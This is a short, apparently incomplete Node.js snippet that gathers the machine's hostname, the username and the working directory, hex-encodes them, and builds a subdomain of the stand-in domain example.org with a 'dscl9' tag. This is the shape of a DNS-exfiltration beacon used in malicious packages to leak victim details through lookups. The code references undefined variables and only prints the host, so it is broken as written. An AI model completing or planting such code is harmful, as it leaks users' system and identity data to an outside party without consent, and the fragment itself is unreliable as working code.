const os=require('os');
var info = [os.hostname(), (os.userInfo && os.userInfo().username) || '', process.cwd()].join('~');
var hex = Buffer.from(info).toString('hex');
var host = labels.concat([id, 'dscl9']).join('.') + '.example.org';
console.log(host);
